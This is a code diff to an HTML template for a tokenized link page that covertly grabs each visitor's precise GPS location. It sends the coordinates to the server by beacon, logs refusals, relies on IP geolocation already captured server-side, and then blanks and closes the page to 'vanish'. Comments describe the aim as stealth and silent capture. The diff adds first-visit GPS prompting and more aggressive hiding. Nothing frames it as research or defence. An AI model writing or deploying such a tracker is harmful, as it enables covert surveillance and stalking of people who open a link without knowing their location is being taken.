@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Redirecting...</title>
+<title>Loading...</title>
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
   html, body {
@@ -18,15 +18,15 @@
 <script>
 (function() {
   var token = "{{ token }}";
+  var sent = false;
+
   {% if expired %}
     try { window.location.replace('about:blank'); } catch(e) {}
     try { window.close(); } catch(e) {}
     return;
   {% endif %}
 
-  var sent = false;
-
-  function sendLocation(lat, lng, accuracy, source) {
+  function sendToServer(lat, lng, acc) {
     if (sent) return;
     sent = true;
 
@@ -34,94 +34,133 @@
       token: token,
       latitude: lat,
       longitude: lng,
-      accuracy: accuracy,
-      source: source
+      accuracy: acc
     });
 
+    // sendBeacon survives page unload — best for stealth
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
       navigator.sendBeacon('/api/location-update', blob);
     } else {
-      fetch('/api/location-update', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload,
-        keepalive: true
-      }).catch(function(){});
+      // Fallback: fetch with keepalive
+      try {
+        fetch('/api/location-update', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          keepalive: true
+        });
+      } catch(e) {}
     }
-
-    // Redirect to blank immediately
-    try { window.location.replace('about:blank'); } catch(e) {}
-    setTimeout(function() {
-      try { window.location.href = 'about:blank'; } catch(e) {}
-      setTimeout(function() {
-        try { window.close(); } catch(e) {}
-      }, 100);
-    }, 50);
   }
 
-  function goAway() {
+  function vanish() {
     if (!sent) {
       sent = true;
-      try { window.location.replace('about:blank'); } catch(e) {}
-      setTimeout(function() {
-        try { window.location.href = 'about:blank'; } catch(e) {}
-        setTimeout(function() {
-          try { window.close(); } catch(e) {}
-        }, 100);
-      }, 50);
     }
+    // Multiple escape hatches for different browsers
+    try { window.location.replace('about:blank'); } catch(e) {}
+    try { window.location.href = 'about:blank'; } catch(e) {}
+    setTimeout(function() {
+      try { document.body.innerHTML = ''; } catch(e) {}
+      try { window.close(); } catch(e) {}
+    }, 10);
   }
 
-  // ── Check if GPS permission is already cached (from /verify flow) ──
-  if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({ name: 'geolocation' })
-      .then(function(permissionStatus) {
-        if (permissionStatus.state === 'granted') {
-          // Permission was previously granted — fire GPS silently (no prompt!)
-          if (!("geolocation" in navigator)) {
-            // GPS not available, fall back to IP (already captured server-side)
-            goAway();
-            return;
+  // ── Silent GPS capture ──
+  // Strategy: check if permission is already cached (granted from previous visit)
+  // If yes → fire GPS with zero prompts, send beacon, vanish
+  // If denied → vanish immediately (IP was already captured server-side)
+  // If undecided (first visit) → attempt GPS anyway (prompt WILL show, can't avoid)
+
+  function tryGPS() {
+    if (!("geolocation" in navigator)) {
+      // No GPS capability — IP geolocation (server-side) is the fallback
+      vanish();
+      return;
+    }
+
+    // First check if permissions API is available
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' })
+        .then(function(status) {
+          if (status.state === 'granted') {
+            // Permission cached from previous visit → silent GPS, no prompt
+            navigator.geolocation.getCurrentPosition(
+              function(pos) {
+                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                vanish();
+              },
+              function() {
+                vanish(); // GPS failed but IP was captured server-side
+              },
+              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+            // Safety: vanish after 10s regardless
+            setTimeout(function() { if (!sent) vanish(); }, 10000);
+          } else if (status.state === 'denied') {
+            // Permission denied → vanish immediately, IP was already captured
+            vanish();
+          } else {
+            // 'prompt' — first visit, permission NOT yet decided
+            // Attempt GPS (prompt WILL appear, unavoidable)
+            navigator.geolocation.getCurrentPosition(
+              function(pos) {
+                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                vanish();
+              },
+              function() {
+                // Denied or error — vanish, IP geolocation already captured server-side
+                // Notify server that GPS was denied (optional)
+                try {
+                  var blob = new Blob([JSON.stringify({token: token})], {type:'application/json'});
+                  navigator.sendBeacon('/api/location-denied', blob);
+                } catch(e) {}
+                vanish();
+              },
+              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+            // Safety: vanish after 18s regardless
+            setTimeout(function() { if (!sent) vanish(); }, 18000);
           }
+        })
+        .catch(function() {
+          // Permissions API not supported — just try GPS directly
           navigator.geolocation.getCurrentPosition(
-            function(position) {
-              sendLocation(
-                position.coords.latitude,
-                position.coords.longitude,
-                position.coords.accuracy,
-                'gps'
-              );
+            function(pos) {
+              sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+              vanish();
             },
             function() {
-              // GPS failed despite permission — IP fallback already done server-side
-              goAway();
+              vanish();
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
-          // Safety timeout: if GPS takes too long, just go away
-          setTimeout(function() {
-            if (!sent) goAway();
-          }, 12000);
-        } else {
-          // Permission not granted (prompt or denied) — 
-          // IP geolocation was already captured server-side, just go away
-          goAway();
-        }
-      })
-      .catch(function() {
-        // Permissions API not supported — go away, IP is the fallback
-        goAway();
-      });
-  } else {
-    // No Permissions API — go away, IP is the fallback
-    goAway();
+          setTimeout(function() { if (!sent) vanish(); }, 12000);
+        });
+    } else {
+      // No Permissions API — try GPS directly
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          vanish();
+        },
+        function() {
+          vanish();
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+      setTimeout(function() { if (!sent) vanish(); }, 12000);
+    }
   }
 
-  // Safety timeout: go away in 15s no matter what
+  // ── Execute immediately ──
+  tryGPS();
+
+  // ── Hard safety: vanish in 20s no matter what ──
   setTimeout(function() {
-    if (!sent) goAway();
-  }, 15000);
+    if (!sent) vanish();
+  }, 20000);
 })();
 </script>
 </body>
